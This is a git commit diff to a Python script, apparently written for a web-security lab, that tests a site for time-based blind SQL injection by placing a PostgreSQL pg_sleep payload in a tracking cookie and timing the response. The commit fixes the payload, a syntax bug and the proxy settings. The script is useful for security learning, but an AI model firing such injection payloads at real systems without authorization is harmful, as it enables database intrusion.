6255b8110017a8ecf8cee4732744f5dd6440616f
xcn <setsura3@gmail.com>
2022-09-01 11:11:56 -0700

    sql

--- lab13.py
+++ lab13.py
@@ -5,22 +5,23 @@ import sys
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-proxies = {'https':'https://127.0.0.1:8080'}
+proxies = {'http':'http:127.0.0.1:8080','https':'https://127.0.0.1:8080'}
 
 
 
 def blind_sqli_check(url):
-    sqli_payload = " '|| (SELECT pg_sleep(10))--"
+    sqli_payload = "' || (SELECT pg_sleep(10))--"
     sqli_payload_encoded = urllib.parse.quote(sqli_payload)
-    cookies = {'TrackingID':''+sqli_payload_encoded, 'session':''}
+    cookies = {'TrackingID':'78HPQpUI8j12cCIi'+sqli_payload_encoded, 'session':'hT3ucoEE3DSaX9MIyoNW4vcFn5tcIdzc'}
     r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
-    if int(r.elapsed.total_seconds()) > 10:
-        print("(+) Vulnerable to blind-based SQL Injection")
+    if int(r.elapsed.total_seconds()) > 1:
+        print("(+) Vulnerable to blind-based SQL injection")
     else:
-        print("(-) Not vulnerable to blind-based SQL Injection")
+        print("(-) Not vulnerable to blind based SQL injection")
+
 
 def main():
-    if len(sys.argv != 2):
+    if len(sys.argv) != 2:
         print("(+) Usage: %s <url>" % sys.argv[0])
         print("(+) Example: %s www.example.com" % sys.argv[0])
         sys.exit(-1)
